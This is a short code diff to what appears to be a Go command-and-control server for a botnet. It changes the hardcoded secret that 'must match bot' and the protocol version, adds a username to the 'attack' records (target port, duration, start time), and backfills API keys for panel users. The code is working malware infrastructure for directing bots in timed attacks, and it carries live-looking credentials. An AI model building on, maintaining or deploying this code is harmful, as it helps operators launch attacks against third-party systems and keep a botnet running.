@@ -41,8 +41,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "pdxZ44GL3p4kV@mY"
-	PROTOCOL_VERSION = "v5.9.11"
+	MAGIC_CODE       = "Y%aBySn$vy6aoRp4"
+	PROTOCOL_VERSION = "V4_2"
 )
 
 // bakedRelayEndpoints holds relay addresses patched in by setup.py.
@@ -83,6 +83,7 @@ type attack struct {
 	port     string
 	duration time.Duration
 	start    time.Time
+	username string
 }
 
 type Credential struct {
@@ -185,6 +186,9 @@ func main() {
 		}
 		fmt.Println("[☾℣☽] Login with username", rootUser.Username, "and password", rootUser.Password)
 	}
+
+	// Backfill API keys for any users that don't have one
+	BackfillAPIKeys()
 
 	// Load TLS configuration
 	logMsg("[INFO] Loading TLS certificates...")
